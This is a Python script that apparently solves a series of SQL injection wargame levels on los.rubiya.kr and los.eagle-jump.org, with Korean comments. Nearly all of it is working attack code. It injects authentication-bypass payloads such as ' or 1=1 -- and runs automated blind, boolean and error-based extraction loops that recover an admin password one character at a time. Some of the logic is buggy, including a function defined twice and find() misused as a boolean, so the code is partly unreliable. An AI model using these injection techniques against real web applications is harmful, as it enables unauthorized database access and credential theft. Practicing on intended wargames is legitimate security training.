# -*- coding:utf-8 -*-

import urllib.request
import urllib.error
import urllib.parse
import binascii

def iron_golem_other_char_check(hdr,pw_index,ans):
    for ascii_char in range(33,128):
        inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + ",1,(select 1 union select 2)) -- "
        
        params = urllib.parse.urlencode({"pw" : inject_sentence})

        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
        
        print(url)

        request = urllib.request.Request(url, headers = hdr)
        response = urllib.request.urlopen(request)

        data = response.read()
        data = data.decode('utf-8')

        if data.find("Subquery returns more than 1 row") == -1:
            ans = ans + str(ascii_char) + " "
            return ans

def iron_golem_admin_check(hdr,pw_index,mid):
    #해당 mid 값이 해당 자리에 맞는 값인지를 확인

    inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))="+ str(mid) + ",1,(select 1 union select 2)) -- "

    params = urllib.parse.urlencode({"pw":inject_sentence})

    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params

    print(url)

    request = urllib.request.Request(url, headers = hdr)
    response = urllib.request.urlopen(request) 

    data = response.read()
    data = data.decode('utf-8')

    if data.find("Subquery returns more than 1 row") == -1:
        ans = [1,mid]
        return ans
    
    ans = [0,0]

    return ans
                
#한글 유니코드값 10진수 범위 : 44032 ~ 50813

def iron_golem(ans,hdr):
    for pw_index in range(1,18):
        kor_range = [44032, 50813]
        op = '<'

        while(kor_range[0] != kor_range[1] and (kor_range[1]-kor_range[0])!=1):
            mid = (kor_range[0] + kor_range[1]) // 2

            admin_chk = iron_golem_admin_check(hdr,pw_index,mid)
            
            if(admin_chk[1] != 0):
                ans = ans + str(admin_chk[1]) + " "
                print(ans)
                break

            inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))" + op + str(mid) + ",1,(select 1 union select 2)) -- "

            params = urllib.parse.urlencode({"pw":inject_sentence})

            url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params

            print(url)

            request = urllib.request.Request(url, headers = hdr)
            response = urllib.request.urlopen(request)
            
            data = response.read()
            data = data.decode('utf-8')

            if data.find("Subquery returns more than 1 row") == -1:
                if(op == '<'):
                    kor_range[1] = mid
                elif(op == '>'):
                    kor_range[0] = mid
            else:
                if(op == '<'): 
                    op = '>'
                elif(op == '>'):
                    op = '<'

        if(admin_chk[0] != 1):
            for admin_index in kor_range:
                admin_chk = iron_golem_admin_check(hdr,pw_index,admin_index)
                
                if(admin_chk[0] == 1):
                    ans = ans + str(admin_chk[1]) + " "
                    print(ans)
                    break

            ans = iron_golem_other_char_check(hdr,pw_index,ans)
            print(ans)
        
                                                                                                                                                                                                                                                                             


                
def xavis(ans,hdr):
    for pw_index in range(1,25):
        for ascii_char in range(33,128):
            inject_sentence = "1' or ascii(substring(hex(pw)," + str(pw_index) + ",1))=" + str(ascii_char) + " -- "
            # 파이썬 상에서 공백은 + 로 인식, 그래서 urlencode 과정에서 + 값이 넘어가면서 --+ 이 주석처리하는 요소로 처리됨

            
            params = urllib.parse.urlencode({'pw':inject_sentence})

            url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?%s" % params
            
            print(url)
            
            request = urllib.request.Request(url, headers = hdr)
            response = urllib.request.urlopen(request)
            
            data = response.read()
            data = data.decode('utf-8')

            if data.find("<h2>Hello admin</h2>") != -1:
                ans = ans + chr(ascii_char)
                print(ans)
                break
        
        if ascii_char == 254:
            print(ans)
            break


def nightmare(ans,hdr):
    for pw_index in range(1,3):
        for ascii_char in range(33,127):
            if pw_index == 1:
                inject_sentence = chr(ascii_char) + "%');%00"
            else:
                inject_sentence = ans + chr(ascii_char) + "');%00"

            params = urllib.parse.urlencode({'pw':inject_sentence})
            
            url = "https://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?%s" % params

            print(url)


            request = urllib.request.Request(url,headers = hdr)
            response = urllib.request.urlopen(request)
            
            data = response.read()
            data = data.decode('utf-8')

            if data.find("<h2>Hello admin</h2>") != -1:
                ans = ans + chr(ascii_char)
                print(ans)
                break
# nightmare 코드는 제대로 됫지만 안됨 


def assassin_admin_chk(ans,hdr):
    params = urllib.parse.urlencode({'pw':ans})

    url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?%s" % params

    
    request = urllib.request.Request(url,headers = hdr)
    response = urllib.request.urlopen(request)

    data = response.read()
    data = data.decode('utf-8')

    return data
        
         
def assassin(ans,hdr):
    guess_temp = ""
    for pw_index in range(1, 9):
        for ascii_char in range(33,127):
            inject_sentence = ans + chr(ascii_char)
            inject_sentence = inject_sentence + "%"
            
            

            params = urllib.parse.urlencode({'pw':inject_sentence})

            url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?%s" % params

            try:
                print(url)
                
                request = urllib.request.Request(url, headers = hdr)
                response = urllib.request.urlopen(request)
                
                data = response.read()
                data = data.decode('utf-8')

                solve_data = assassin_admin_chk(ans,hdr)
                
                if solve_data.find("<h2>Hello admin</h2>") != -1:
                    print(ans)
                    break
                    
                if ascii_char == 37 or ascii_char == 95:
                    continue

                if data.find("<h2>Hello admin</h2>") != -1:
                    ans = ans + chr(ascii_char)
                    print(ans)
                    break

                elif data.find("<h2>Hello guest</h2>") != -1:
                    guess_temp = chr(ascii_char)

                if ascii_char == 126 :
                    ans = ans + guess_temp
                    print(ans)
                    break

            except urllib.error.HTTPError as e:
                print(e)

    
def bugbear(ans,hdr):
    for pw_index in range(1,9):
        for ascii_char in range(33,127):
            inject_sentence = "1||right(left(pw," + str(pw_index) + "),1)\nin(char(" + str(ascii_char) + "))"
            params = urllib.parse.urlencode({'pw':1,'no':inject_sentence})
            
            url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?%s" % params

            try:
                print(url)
                
                request = urllib.request.Request(url, headers = hdr)
                response = urllib.request.urlopen(request)
                
                data = response.read()
                data = data.decode('utf-8')
                if data.find("<h2>Hello admin</h2>") != -1:
                    ans = ans + chr(ascii_char)
                    print(ans)
                    break
                if data.find("<h2>Hello guest</h2>") != -1:
                    temp = chr(ascii_char)

                if ascii_char == 126:
                    ans = ans + temp
                    print(ans)
                    break
                
                

            except urllib.error.HTTPError as e:
                print(e)

    
def darknight(ans,hdr):
    for pw_index in range(1,9):
        for ascii_char in range(0,255):
            inject_sentence = "1||right(left(pw," + str(pw_index) + "),1) like char(" + str(ascii_char) + ")"
            params = urllib.parse.urlencode({'pw': 1, 'no': inject_sentence})

            url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?%s" % params

            try:
                print(url)
                request = urllib.request.Request(url, headers = hdr)
                response = urllib.request.urlopen(request)
                
                data = response.read()
                data = data.decode('utf-8')
                if data.find("<h2>Hello guest</h2>") != -1:
                    temp = chr(ascii_char)
                if ascii_char == 254:
                    ans = ans + temp
                    print(ans)
                    break

                if data.find("<h2>Hello admin</h2>") != -1:
                    ans = ans + chr(ascii_char)
                    print(ans)
                    break

            except urllib.error.HTTPError as e:
                print(e)


def golem_request(ans,hdr,mid,op,pw_index):

    inject_sentence = "123\' || ascii(right(left(pw," + str(pw_index) + "),1))" + op + str(mid) + " && id like 'admin' -- \'"
    params = urllib.parse.urlencode({'pw' : inject_sentence})
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?%s" % params

    print(url)
    request = urllib.request.Request(url, headers = hdr)
    response = urllib.request.urlopen(request)

    data = response.read()
    data = data.decode('utf-8')

    return data
    #이진트리로 해결해 보려는 잔해...
 

def golem(ans,hdr):
    op = '<'
     
    for pw_index in range(1,9):
        binary_search = [33,127]
        

        while binary_search[0] != binary_search[1] or (binary_search[0] - binary_search[1]) == -1:
            mid = (binary_search[0] + binary_search[1]) // 2
            data = golem_request(ans,hdr,mid,op,pw_index)
            if data.find("<h2>Hello admin</h2>") != -1:
                if op == '<':
                    binary_search[1] = mid
                elif op == '>':
                    binary_search[0] = mid
                
            else:
                data = golem_request(ans,hdr,mid,' like ',pw_index)
                if data.find("<h2>Hello admin</h2>") != -1:
                    break
                elif op == '<':
                    op = '>'
                elif op == '>':
                    op = '<'
            
    
        ans = ans + chr(mid)
        print(ans)
        
def orge(ans,hdr):
    for pw_index in range(1,9):
        for ascii_char in range(33,127):
            inject_sentence = "1\' || ascii(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + " --\'"
            params = urllib.parse.urlencode({'pw' : inject_sentence})
            url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?%s" % params
            try:
                print(url)
                request = urllib.request.Request(url, headers = hdr)
                response = urllib.request.urlopen(request)
                
                data = response.read()
                data = data.decode('utf-8')
                
                if data.find("<h2>Hello admin</h2>") != -1:
                    ans = ans + chr(ascii_char)
                    print(ans)
                    break

            except urllib.error.HTTPError as e:
                print(e)

def orc(ans,hdr):
    for pw_index in range(1,9): 
        for ascii_char in range(33,127):    
            inject_sentance = "1\' or id=\'admin\' and ascii(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + " --\'"
            params = urllib.parse.urlencode({'pw' : inject_sentance})
            url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?%s" % params
            try:
                print(url)
                request = urllib.request.Request(url, headers = hdr)
                response = urllib.request.urlopen(request)
                
                data = response.read()
                data = data.decode('utf-8')
                if data.find("<h2>Hello admin</h2>") != -1:
                    ans = ans + chr(ascii_char)
                    print(ans)
                    break

            except urllib.error.HTTPError as e:
                print(e)

def default_sqlinjection(hdrs, url):
    try:
        request = urllib.request.Request(url, headers = hdrs)
        response = urllib.request.urlopen(request)
        
        data = response.read()
        data = data.decode('utf-8')
        
        if data.find("<h2>Clear!</h2>"):
            print("Clear!")
        else:
            print('Solve Fail')

    except urllib.error.HTTPError as e:
        print(e)

def blind_sqlinjection(hdrs,blind_url,pw_char):
    try:
        request = urllib.request.Request(blind_url, headers = hdrs)
        response = urllib.request.urlopen(request)
        
        data = response.read()
        data = data.decode('utf-8')
        
        if data.find("<h2>Hello admin</h2>"):
            return pw_char
        else:
            return 0

    except urllib.error.HTTPError as e:
        print(e)

def orc(hdrs):
    ans = ""
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
    
    for pw_length in range(1,9):
        for pw_char in range(33,128):
            inject_sentence = "?pw=1\' or ord(substring(pw," + str(pw_length) + ",1))=" + str(pw_char) + " -- "
            blind_url = url + inject_sentence
            
            
            print(blind_url)

            find_pw_char = blind_sqlinjection(hdrs, blind_url,pw_char)
            
            if find_pw_char != 0:
               ans = ans + chr(pw_char)
               print(ans)
               break
            elif find_pw_char == 0:
                continue
    
    return ans
    

            
    
def goblin(hdrs):
    ans = ""
    url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
    admin_hex = binascii.hexlify('admin'.encode()).decode()
    # 'admin'.encode() 통해서 byte 형식으로 전환
    # decode() 를 통해서 unicode, 즉 문자열로 전환

    inject_sentence = "?no=2 or id=0x" + admin_hex
    url = url + inject_sentence
    
    print(inject_sentence)
    default_sqlinjection(hdrs, url)

def cobolt(hdrs):
    
    url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
    inject_sentence = "?id=admin\' or 1=1 -- "
    url = url + inject_sentence
    
    print(inject_sentence)

    default_sqlinjection(hdrs, url)


def gremlin(hdrs):
    
    url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
    inject_sentence = "?id=admin&&pw=123\' or 1=1 -- \'"
    url = url + inject_sentence

    print(inject_sentence)
    
    default_sqlinjection(hdrs, url)
        